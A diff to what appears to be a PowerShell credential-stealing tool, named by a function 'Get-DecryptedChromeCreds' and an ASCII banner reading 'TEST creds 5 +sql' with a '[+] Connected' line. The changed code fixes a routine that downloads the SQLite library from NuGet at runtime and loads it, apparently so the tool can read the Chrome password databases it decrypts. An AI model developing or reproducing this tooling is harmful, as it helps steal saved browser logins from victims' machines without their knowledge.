@@ -400,7 +400,7 @@ function PortSuggest {
     $dllPath = "$env:TEMP\System.Data.SQLite.dll"
     $nupkgUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/1.0.113.6"
     $zipPath = "$env:TEMP\sqlite_nuget.zip"
-    $extractPath = "$env:TEMP\sqlite_nupkg"
+    $extractPath = "$env:TEMP\sqlite_nuget"
 
     try {
         Output-Log "[*] Downloading SQLite .nupkg from NuGet..."
@@ -412,27 +412,35 @@ function PortSuggest {
         }
         Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
 
-        # Ищем DLL в папках lib/net40/ или lib/net462/
+        # Поиск DLL в lib/net4*, потому что PowerShell 5.1 — это .NET Framework
         $foundDll = Get-ChildItem -Path "$extractPath\lib" -Recurse -Filter "System.Data.SQLite.dll" |
-                    Where-Object { $_.FullName -like "*net4*" } |
+                    Where-Object { $_.FullName -match "net4" } |
                     Select-Object -First 1
 
         if (-not $foundDll) {
-            return "[ERROR] SQLite DLL not found in .nupkg package."
+            Output-Log "[ERROR] DLL not found in extracted package."
+            return $false
         }
 
+        Output-Log "[*] Found SQLite DLL at: $($foundDll.FullName)"
         Copy-Item $foundDll.FullName -Destination $dllPath -Force
+
+        Output-Log "[*] Loading DLL into PowerShell..."
         Add-Type -Path $dllPath -ErrorAction Stop
 
-        Output-Log "[+] Loaded SQLite from NuGet package."
+        Output-Log "[+] SQLite DLL loaded successfully!"
         return $true
-    } catch {
-        return "[ERROR] Load-SQLite failed: $($_.Exception.Message)"
-    } finally {
+    }
+    catch {
+        Output-Log "[ERROR] Load-SQLite failed: $($_.Exception.Message)"
+        return $false
+    }
+    finally {
         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
         Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
     }
 }
+
 
 
 function Get-DecryptedChromeCreds {
@@ -730,7 +738,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 4 +sql
+                                            TEST creds 5 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
